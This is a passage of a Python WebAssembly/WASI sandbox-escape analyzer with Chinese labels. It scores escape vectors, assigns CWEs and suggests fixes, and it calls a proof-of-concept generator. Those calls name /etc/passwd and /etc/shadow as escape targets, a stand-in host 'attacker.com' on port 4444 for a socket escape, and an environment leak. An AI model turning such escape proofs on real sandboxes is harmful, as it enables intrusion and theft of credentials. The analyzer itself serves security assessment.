        for imp in di:
            vid+=1
            sev=SeverityLevel.HIGH if imp.capability in (WASICapability.PROC_EXEC,WASICapability.SOCK_OPEN,WASICapability.PATH_OPEN) else SeverityLevel.MEDIUM
            pc=""
            if imp.capability==WASICapability.PATH_OPEN: pc=PoCGenerator.generate_fs_escape_poc("/sandbox","/etc/passwd")
            elif imp.capability==WASICapability.SOCK_OPEN: pc=PoCGenerator.generate_socket_escape_poc("attacker.com",4444)
            elif imp.capability==WASICapability.ENVIRON_GET: pc=PoCGenerator.generate_environ_leak_poc()
            ev=EscapeVector(f"WASI-ESC-{vid:03d}",EscapeVectorType.IMPORT_FUNCTION_HIJACK,sev,f"危险WASI导入:{imp.function_name}",f"模块导入了危险的WASI函数{imp.module_name}.{imp.function_name}:{imp.risk_reason}",[imp.function_name],None,None,[],"easy" if imp.capability==WASICapability.ENVIRON_GET else "medium",pc,f"移除或限制{imp.function_name}的访问权限","CWE-250" if imp.capability==WASICapability.PROC_EXEC else "CWE-284")
            ev.seewasm_path_depth=1; lv.append(ev)
        if mp and mp.is_suspicious:
            vid+=1
            ev=EscapeVector(f"WASI-ESC-{vid:03d}",EscapeVectorType.MEMORY_GROW_ABUSE,SeverityLevel.CRITICAL if mp.exceeds_guard else SeverityLevel.HIGH,"线性内存增长可能突破沙箱边界",mp.suspicion_reason,None,mp,None,[],"medium",PoCGenerator.generate_memory_escape_poc(mp.total_allocated_pages),"设置合理的内存最大页数限制","CWE-787")
            ev.seewasm_path_depth=1; lv.append(ev)
        if tp and tp.is_suspicious:
            vid+=1; ev=EscapeVector(f"WASI-ESC-{vid:03d}",EscapeVectorType.TABLE_MANIPULATION,SeverityLevel.HIGH,"Table操作可能劫持间接调用",tp.suspicion_reason,None,None,tp,[],"hard","","限制table最大大小","CWE-843"); ev.seewasm_path_depth=2; lv.append(ev)
        ldf=[f for f in fd if f.is_dangerous]
        if ldf:
            vid+=1; allr="; ".join(f.risk_description for f in ldf); ht=any("../" in f.path for f in ldf)
            ev=EscapeVector(f"WASI-ESC-{vid:03d}",EscapeVectorType.FD_PATH_TRAVERSAL,SeverityLevel.CRITICAL,"文件系统路径穿越逃逸",f"检测到危险的文件描述符操作:{allr}",None,None,None,ldf,"easy" if ht else "medium",PoCGenerator.generate_fs_escape_poc("/sandbox","/etc/shadow"),"实现路径规范化检查","CWE-22")
            ev.seewasm_path_depth=2; lv.append(ev)
        for pf2 in pf:
            if pf2.get("severity") in ("CRITICAL","HIGH"):
                vid+=1; ev=EscapeVector(f"WASI-ESC-{vid:03d}",EscapeVectorType.FD_PREOPEN_LEAK,SeverityLevel.CRITICAL if pf2.get("severity")=="CRITICAL" else SeverityLevel.HIGH,"预打开目录权限过大",f"预打开目录{pf2['preopen_path']}存在风险:{pf2['risk']}",None,None,None,[],"easy","",f"缩小预打开目录范围","CWE-552"); ev.seewasm_path_depth=1; lv.append(ev)
        if sa.get("external_connections"):
            vid+=1; ev=EscapeVector(f"WASI-ESC-{vid:03d}",EscapeVectorType.SOCKET_ABUSE,SeverityLevel.HIGH,"网络套接字逃逸",f"检测到{len(sa['external_connections'])}个外部连接尝试",None,None,None,[],"medium",PoCGenerator.generate_socket_escape_poc("attacker.com",4444),"限制网络访问白名单","CWE-923"); ev.seewasm_path_depth=3; lv.append(ev)
        for risk in sa.get("risks",[]):
            if risk.get("severity")=="CRITICAL":
                vid+=1; ev=EscapeVector(f"WASI-ESC-{vid:03d}",EscapeVectorType.SOCKET_ABUSE,SeverityLevel.CRITICAL,f"网络逃逸:{risk.get('type','unknown')}",risk.get("description",""),None,None,None,[],"medium","","禁用原始套接字和危险网络操作"); ev.seewasm_path_depth=3; lv.append(ev)
        for combo in ca.get("dangerous_combinations",[]):
            vid+=1; szsev=combo.get("severity","MEDIUM")
            sm={SeverityLevel.CRITICAL:SeverityLevel.CRITICAL,SeverityLevel.HIGH:SeverityLevel.HIGH,SeverityLevel.MEDIUM:SeverityLevel.MEDIUM,SeverityLevel.LOW:SeverityLevel.LOW,SeverityLevel.INFO:SeverityLevel.INFO}
            sev=sm.get(szsev,SeverityLevel.MEDIUM)
            ev=EscapeVector(f"WASI-ESC-{vid:03d}",EscapeVectorType.CAPABILITY_CONFUSION,sev,"危险能力组合",combo.get("description",""),combo.get("capabilities",[]),None,None,[],"medium","","实施最小权限原则","CWE-1220")
            ev.seewasm_path_depth=2; lv.append(ev)
        if bf:
            lcb=[f for f in bf if f["pattern_type"] in ("call_indirect","hi_offset_load","hi_offset_store")]
            if lcb:
                vid+=1; ev=EscapeVector(f"WASI-ESC-{vid:03d}",EscapeVectorType.INDIRECT_CALL_HIJACK,SeverityLevel.HIGH,"字节码级别可疑模式",f"检测到{len(lcb)}种可疑字节码模式:{', '.join(f['pattern_type'] for f in lcb)}",None,None,None,[],"hard","","检查并修复相关字节码模式","CWE-823"); ev.seewasm_path_depth=1; lv.append(ev)
        # Wemby 内存损坏: 无上限 memory + 高偏移操作 → 逃逸先决条件
        if mp and mp.wemby_corruption_risk:
            vid+=1; ev=EscapeVector(f"WASI-ESC-{vid:03d}",EscapeVectorType.MEMORY_CORRUPTION,SeverityLevel.CRITICAL if mp.exceeds_guard else SeverityLevel.HIGH,"Wemby-style内存损坏风险",f"无上限memory+growth组合满足内存损坏先决条件:{mp.suspicion_reason}",None,mp,None,[],"medium","","为memory设置合理上限，添加red zone","CWE-787"); ev.seewasm_path_depth=2; lv.append(ev)
        return lv

    def _calculate_overall_risk(s,ev,mp,tp,ca):
        if ev is None: ev=[]
        if ca is None: ca={}
        fs=10.0; ded={SeverityLevel.CRITICAL:2.5,SeverityLevel.HIGH:1.5,SeverityLevel.MEDIUM:0.8,SeverityLevel.LOW:0.3,SeverityLevel.INFO:0.1}
        for v in ev: fs-=ded.get(v.severity,0.5)
        if mp and mp.is_suspicious: fs-=1.5 if mp.exceeds_guard else 0.5
        if tp and tp.is_suspicious: fs-=1.0
        fcs=ca.get("capability_score",10.0); fs=(fs+fcs)/2.0; fs=round(min(max(fs,0.0),10.0),1)
        if fs<=2.0: l=SeverityLevel.CRITICAL
        elif fs<=4.0: l=SeverityLevel.HIGH
        elif fs<=6.0: l=SeverityLevel.MEDIUM
        elif fs<=8.0: l=SeverityLevel.LOW
        else: l=SeverityLevel.INFO
        return l,fs

    def _infer_sandbox_type(s,imports):
        if imports is None: return WASISandboxType(WASISandboxType.UNKNOWN)
        sm=set()
        for imp in imports:
            m=imp.get("module","").lower()
            if "wasi" in m: sm.add(m)
        sms=" ".join(sm)
        if "wasi_snapshot_preview1" in sms: return WASISandboxType(WASISandboxType.WASI_SDK)
        elif "wasi_unstable" in sms: return WASISandboxType(WASISandboxType.LUCET)
        elif "wasix" in sms: return WASISandboxType(WASISandboxType.WASMER)
        elif "wasi_ephemeral" in sms: return WASISandboxType(WASISandboxType.WASMTIME)
        sin=set()
        for imp in imports: sin.add(imp.get("name","").lower())
        if "wasi_snapshot_preview1" in sm or any("wasi" in m for m in sm):
            return WASISandboxType(WASISandboxType.WASMEDGE if "sock_open" in sin else WASISandboxType.WASI_SDK)
        return WASISandboxType(WASISandboxType.UNKNOWN)

    @staticmethod
    def _memory_risk_level(p,f):
        if p is None: return SeverityLevel.LOW
        if f is None: f=[]
        if p.exceeds_guard: return SeverityLevel.CRITICAL
        if p.is_suspicious: return SeverityLevel.HIGH
        if f: return SeverityLevel.MEDIUM
        return SeverityLevel.LOW

    @staticmethod
    def _table_risk_level(p):
        if p is None: return SeverityLevel.LOW
        if p.grow_operations>0 and p.indirect_calls_targeting>50: return SeverityLevel.CRITICAL
        if p.is_suspicious: return SeverityLevel.HIGH
        if p.element_segments>10: return SeverityLevel.MEDIUM
        return SeverityLevel.LOW

    @staticmethod
    def _fs_risk_level(fo,pf):
        if fo is None: fo=[]
        if pf is None: pf=[]
        if any(p.get("severity")=="CRITICAL" for p in pf): return SeverityLevel.CRITICAL
        if any(f.is_dangerous for f in fo): return SeverityLevel.HIGH
        if fo or pf: return SeverityLevel.MEDIUM
        return SeverityLevel.LOW

    @staticmethod
    def _network_risk_level(sa):
        if sa is None: return SeverityLevel.LOW
        if sa.get("external_connections"): return SeverityLevel.HIGH
        if sa.get("listen_sockets",0)>0: return SeverityLevel.MEDIUM
        if sa.get("total_sockets",0)>0: return SeverityLevel.MEDIUM
        return SeverityLevel.LOW


def analyze_wasi_sandbox_escape(**kw):
    a=WASISandboxEscapeAnalyzer(); a.initialize(kw.get("config")); r=a.analyze(**kw); a.finalize(); return r

def quick_scan_imports(imports):
    if imports is None: return {"total_imports":0,"dangerous_count":0,"dangerous_imports":[],"safe_count":0}
    e=WASIImportAnalyzer.analyze(imports); ld=[x.to_dict() for x in e if x.is_dangerous]
    return {"total_imports":len(e),"dangerous_count":len(ld),"dangerous_imports":ld,"safe_count":len(e)-len(ld)}

def check_fd_path_traversal(ft):
    if ft is None: return []
    return [o for o in FileSystemEscapeAnalyzer.analyze_fd_operations(ft) if o.is_dangerous]

def generate_escape_poc(vt,**kw):
    g={"fs_escape":lambda:PoCGenerator.generate_fs_escape_poc(kw.get("preopen_path","/sandbox"),kw.get("target_path","/etc/passwd")),"memory_escape":lambda:PoCGenerator.generate_memory_escape_poc(kw.get("target_size_pages",65536)),"socket_escape":lambda:PoCGenerator.generate_socket_escape_poc(kw.get("target_host","attacker.com"),kw.get("target_port",4444)),"environ_leak":PoCGenerator.generate_environ_leak_poc}
    gen=g.get(vt); return gen() if gen else f"// Unknown escape vector type: {vt}"
